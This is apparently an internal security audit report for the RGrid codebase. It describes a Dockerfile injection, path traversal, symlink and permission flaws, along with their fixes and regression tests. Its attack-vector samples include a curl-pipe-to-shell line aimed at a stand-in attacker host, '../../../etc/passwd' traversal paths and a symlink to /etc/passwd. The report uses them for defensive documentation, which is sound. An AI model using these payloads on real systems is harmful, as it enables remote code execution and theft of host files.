# RGrid Security Audit Report

**Date:** 2024 Phase 2 Stabilization Sprint
**Auditor:** Dev 2 (Full-Stack Bridge)
**Scope:** API, Runner, CLI, Common modules

## Executive Summary

A comprehensive security audit was conducted on the RGrid codebase. **6 vulnerabilities** were identified and fixed:
- 1 CRITICAL (Remote Code Execution potential)
- 3 HIGH (Path traversal, symlink attacks)
- 2 MEDIUM (Credential security, runtime passthrough)

All vulnerabilities have been remediated with **24 security tests** added to prevent regression.

**Test Results:** 905 tests passing (up from 851)

---

## Vulnerabilities Found and Fixed

### CRITICAL-1: Dockerfile Injection via Runtime

**Location:** `common/rgrid_common/runtimes.py:59`
**Severity:** CRITICAL
**Status:** FIXED

**Vulnerability:**
The `resolve_runtime()` function would pass through unknown runtime strings directly to Docker build. An attacker could inject malicious Dockerfile instructions.

**Attack Vector:**
```python
runtime = "python:3.11\nRUN curl http://attacker.com/payload | sh"
```

This would execute arbitrary code on the worker node during `docker build`.

**Fix:**
- Changed from passthrough to strict allowlist validation
- Added `UnsupportedRuntimeError` exception for unknown runtimes
- Added `DOCKER_IMAGE_PATTERN` regex for additional validation
- Only explicitly listed runtimes in `RUNTIME_MAP` are allowed

**Files Changed:**
- `common/rgrid_common/runtimes.py`

---

### HIGH-1: Path Traversal in File Downloads (Runner)

**Location:** `runner/runner/file_handler.py:30`
**Severity:** HIGH
**Status:** FIXED

**Vulnerability:**
Filenames from download URLs were used directly to construct file paths without validation.

**Attack Vector:**
```python
download_urls = {"../../../etc/passwd": "http://..."}
```

**Fix:**
- Added `validate_safe_filename()` function
- Validates against `..`, absolute paths, null bytes
- Verifies resolved path stays within work directory
- Added `PathTraversalError` exception

**Files Changed:**
- `runner/runner/file_handler.py`

---

### HIGH-2: Symlink Attack in Output Collection

**Location:** `runner/runner/output_collector.py:30-41`
**Severity:** HIGH
**Status:** FIXED

**Vulnerability:**
Output collection followed symlinks, allowing containers to exfiltrate host files.

**Attack Vector:**
A malicious container script could create:
```bash
ln -s /etc/passwd /work/output.txt
```

**Fix:**
- Added `followlinks=False` to `os.walk()`
- Skip symlink files with `is_symlink()` check
- Verify resolved paths stay within work directory
- Log security warnings for blocked files

**Files Changed:**
- `runner/runner/output_collector.py`

---

### HIGH-3: Path Traversal in CLI Downloads

**Location:** `cli/rgrid/batch_download.py:100-113`, `cli/rgrid/commands/download.py:101`
**Severity:** HIGH
**Status:** FIXED

**Vulnerability:**
Filenames and artifact paths from API responses were used without validation.

**Attack Vector:**
Malicious API response with `filename: "../../../etc/overwrite"`

**Fix:**
- Added `validate_safe_path()` function in `batch_download.py`
- Added `sanitize_filename()` function in `download.py`
- All paths validated to stay within output directory
- Updated `sanitize_output_dirname()` to block traversal sequences

**Files Changed:**
- `cli/rgrid/batch_download.py`
- `cli/rgrid/commands/download.py`

---

### MEDIUM-1: Config Directory Permissions

**Location:** `cli/rgrid/config.py:18`
**Severity:** MEDIUM
**Status:** FIXED

**Vulnerability:**
Config directory created with default umask (potentially world-readable).

**Fix:**
- Directory created with `mode=0o700`
- File written with `umask(0o077)` set
- Explicit `chmod(0o600)` on credentials file
- Fixed TOCTOU race condition

**Files Changed:**
- `cli/rgrid/config.py`

---

### MEDIUM-2: Runtime Passthrough (Same as CRITICAL-1)

See CRITICAL-1 above. This was the root cause of the passthrough behavior.

---

## Positive Security Findings

The following security practices were already in place:

1. **Network Isolation**: Containers run with `network_mode="none"` by default
2. **Read-only Script Mount**: Script directory mounted as `mode: "ro"`
3. **No shell=True**: Subprocess calls use list-based commands
4. **Resource Limits**: Memory and CPU limits enforced on containers
5. **Docker SDK**: Using Docker SDK instead of CLI prevents command injection
6. **Atomic Job Claiming**: `FOR UPDATE SKIP LOCKED` prevents race conditions
7. **Presigned URLs**: File transfers use presigned URLs, not direct credentials

---

## Security Tests Added

**File:** `tests/unit/test_security.py`
**Count:** 24 tests

### Test Categories:

1. **TestRuntimeSecurity** (5 tests)
   - Dockerfile injection via newline blocked
   - Dockerfile injection via multi-FROM blocked
   - Arbitrary images blocked
   - Only allowlisted runtimes accepted
   - Docker image pattern validation

2. **TestFileHandlerSecurity** (5 tests)
   - Path traversal with `..` blocked
   - Nested `..` traversal blocked
   - Absolute paths blocked
   - Null byte injection blocked
   - Valid filenames accepted

3. **TestOutputCollectorSecurity** (3 tests)
   - Symlink to sensitive files skipped
   - Symlink directories not followed
   - Regular files collected correctly

4. **TestCLIDownloadSecurity** (7 tests)
   - Path traversal blocked
   - Null byte blocked
   - Absolute path escape blocked
   - Directory sanitization works
   - Filename sanitization removes paths
   - Null bytes removed from filenames
   - construct_output_path validates paths

5. **TestConfigSecurity** (2 tests)
   - Config directory permissions (0700)
   - Credentials file permissions (0600)

6. **TestSecurityRegressions** (2 tests)
   - All RUNTIME_MAP entries match pattern
   - No shell=True in codebase

---

## Recommendations

### Implemented
- [x] Runtime allowlist with strict validation
- [x] Path traversal prevention in all file operations
- [x] Symlink attack prevention
- [x] Secure credential storage

### Future Considerations

1. **Rate Limiting**: Consider adding rate limits to API endpoints
2. **Input Validation**: Add Pydantic validators for filenames in API models
3. **Audit Logging**: Log security events (blocked attacks, etc.)
4. **Container Scanning**: Consider scanning custom images before execution
5. **Secret Detection**: Add pre-commit hook to detect committed secrets

---

## Test Verification

```bash
# Run all tests
venv/bin/pytest tests/ -v

# Run only security tests
venv/bin/pytest tests/unit/test_security.py -v

# Test count verification
# Before: 851 passed
# After:  905 passed (+54 new tests, including 24 security tests)
```

---

## Conclusion

The security audit identified and fixed critical vulnerabilities that could have allowed:
- Remote code execution on worker nodes
- Arbitrary file read/write via path traversal
- Exfiltration of host files via symlink attacks
- Credential exposure via weak permissions

All vulnerabilities have been remediated with comprehensive tests to prevent regression. The RGrid codebase is now significantly more secure for production deployment.

---

*Report generated as part of Phase 2 Stabilization Sprint*
